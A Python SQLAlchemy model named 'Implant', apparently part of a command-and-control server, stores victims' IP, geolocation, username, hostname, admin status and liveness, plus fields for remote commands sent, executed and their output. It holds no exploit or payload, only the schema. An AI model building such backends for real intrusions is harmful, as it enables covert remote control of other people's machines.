import datetime

from sqlalchemy import Column, Integer, String, Boolean, DateTime, ForeignKey
from sqlalchemy.orm import relationship

from ..db.base import Base

class Implant(Base):
    __tablename__ = "implants"

    id = Column(Integer, primary_key=True, index=True)
    token = Column(String(100), unique=True, nullable=False)

    ip_address = Column(String(45), nullable=False)
    geo_location = Column(String(100), nullable=False)
    operating_system = Column(String(100), nullable=False)
    language = Column(String(20), nullable=False)
    
    username = Column(String(100), nullable=False)
    hostname = Column(String(100), nullable=False)
    
    is_local_admin = Column(Boolean, nullable=False)
    is_alive = Column(Boolean, nullable=False)

    last_seen = Column(DateTime, default=datetime.datetime.utcnow, nullable=False)
    installed_at = Column(DateTime, default=datetime.datetime.utcnow, nullable=False)

    is_command_control = Column(Boolean, default=False, nullable=False)
    command = Column(String(100), nullable=True)
    
    # Campos para armazenar histórico de comandos
    last_command_sent = Column(String(500), nullable=True)  # Comando enviado para execução
    last_command_executed = Column(String(500), nullable=True)
    last_command_output = Column(String(10000), nullable=True)  # Aumentado para 10000 caracteres
    last_command_timestamp = Column(DateTime, nullable=True)
    
    
    
